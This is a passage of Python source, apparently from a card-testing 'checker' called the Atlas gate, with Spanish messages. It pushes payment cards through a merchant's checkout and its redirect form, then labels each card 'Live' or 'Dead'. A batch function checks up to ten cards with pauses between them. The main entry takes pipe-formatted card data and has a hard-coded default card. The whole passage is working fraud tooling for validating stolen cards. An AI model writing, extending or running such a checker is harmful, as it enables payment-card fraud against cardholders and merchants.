            m_act = re.search(
                r'<form[^>]*name="redirectForm"[^>]*action="([^"]+)"', source, re.I
            )
            if m_act:
                back_url = html.unescape(m_act.group(1))
                back_fields = {
                    mi.group(1): html.unescape(mi.group(2))
                    for mi in re.finditer(
                        r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', source, re.I
                    )
                }
                r12 = sess.post(
                    back_url, data=back_fields, timeout=40
                )
                back_body = r12.text or ""
                low12 = back_body.lower()
                if "you have paid successfully" in low12 or "thank you for your order" in low12:
                    confirmed = True
        except Exception as exc:
            logger.debug("No se pudo confirmar el redirectForm: %s", exc)

        if result.strip() == "0" or confirmed:
            return {
                "status": "✅ Live",
                "message": f"Tarjeta aprobada. {detail}",
                "time": tiempo,
            }
        if result or "RESPMSG" in source:
            return {
                "status": "❌ Dead",
                "message": detail or "Tarjeta declinada.",
                "time": tiempo,
            }
        return _err(tiempo)

    except Exception:
        logger.exception("Atlas gate: excepción no controlada")
        return _err(_t())


async def atlas_check_multiple(
    cards: List[str],
    callback: Optional[Callable[[int, Dict[str, str], str, int], None]] = None,
    user_id: Optional[int] = None,
) -> List[Dict[str, str]]:
    clean = [c.strip() for c in cards if c.strip()][:10]
    results: List[Dict[str, str]] = []
    for i, card in enumerate(clean):
        result = await atlas_check(card, user_id)
        results.append(result)
        if callback:
            try:
                await callback(i, result, card, user_id or 0)
            except Exception:
                logger.exception("Error en callback de Atlas mass")
        if i < len(clean) - 1:
            await asyncio.sleep(8)
    return results


def _debug_save_receipt(step: str, status_code: int, body: str) -> None:
    try:
        debug_dir = Path("data/atlas_debug")
        debug_dir.mkdir(parents=True, exist_ok=True)
        redacted = re.sub(r"\d{12,19}", "[PAN]", body or "")
        content = f"STEP: {step}\nSTATUS: {status_code}\n--- BODY ---\n{redacted[:20000]}\n"
        (debug_dir / f"{step}_{int(time.time())}.txt").write_text(content, encoding="utf-8")
    except Exception:
        pass


if __name__ == "__main__":
    import json
    import sys

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")
    logging.getLogger("urllib3").setLevel(logging.WARNING)
    card = sys.argv[1] if len(sys.argv) > 1 else "4347697122326124|03|2030|714"
    print(json.dumps(asyncio.run(atlas_check(card)), indent=2, ensure_ascii=False))
